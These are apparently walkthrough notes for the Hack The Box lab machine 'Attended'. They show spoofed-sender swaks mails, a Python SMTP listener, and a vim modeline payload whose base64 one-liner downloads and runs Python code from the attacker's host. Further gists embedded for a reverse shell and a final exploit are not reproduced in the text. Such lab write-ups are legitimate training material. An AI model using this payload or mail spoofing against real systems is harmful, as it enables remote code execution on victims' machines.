---
description: 'Notes for https://youtu.be/uAvvrBO7zlk'
---

# Attended

## User

### Send mails via swaks

```bash
1) swaks --from 'root@attended.htb' --to 'guly@attended.htb' --header "Subject: Please subscribe" --body 'and click the like button' --server attended.htb
2) swaks --from 'freshness@attended.htb' --to 'guly@attended.htb' --header "Subject: Please subscribe" --body 'and click the like button' --server attended.htb
3) swaks --from 'freshness@attended.htb' --to 'guly@attended.htb' --header "Subject: Please subscribe" --body 'and click the like button' --server attended.htb --attach payload.txt
```

### Mail Server

```python
from __future__ import print_function
from datetime import datetime
import asyncore
from smtpd import SMTPServer

class EmlServer(SMTPServer):
    def process_message(self, peer, mailfrom, rcpttos, data, mail_options=None,rcpt_options=None):
        print(f"From: {mailfrom}")
        print(f"To: {rcpttos}")
        print("Data:")
        for line in data.split(b"\n"):
            print(line)

def run():
    EmlServer(('0.0.0.0', 25), None)
    try:
        asyncore.loop()
    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    run()
```

#### Payload.txt

This pulls a \(python-\) file called "x" from our webserver and executes it: 

```bash
:!echo aW1wb3J0IHJlcXVlc3RzIGFzIHI7ZXhlYyhyLmdldCgnaHR0cDovLzEwLjEwLjE0Ljc4L3gnKS50ZXh0KQ==| openssl base64 -d -A | python2.7 -
||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=1:fdt="
```

### HTTP Reverse Shell

{% embed url="https://gist.github.com/xct/4bfa24536d632f5ea06fd1f91ad8cdf4" %}

## Root

### Prepare OpenBSD VM

```bash
export PKG_PATH=https://mirror.fsrv.services/pub/OpenBSD/6.8/packages/amd64/
pkg_add -v gdb
pkg_add wget
pkg_add nano
pkg_add py3-pip
pkg_add git
wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py
echo source ~/.gdbinit-gef.py >> ~/.gdbinit
export LC_CTYPE=C.UTF-8
egdb
```

### EAX-Finder

{% embed url="https://gist.github.com/xct/40ba6491494e1dc4a41327b10d19ce75" %}

### Final Exploit

{% embed url="https://gist.github.com/xct/4b4dea85e9483eaa5aeaa9e80b71349e" %}



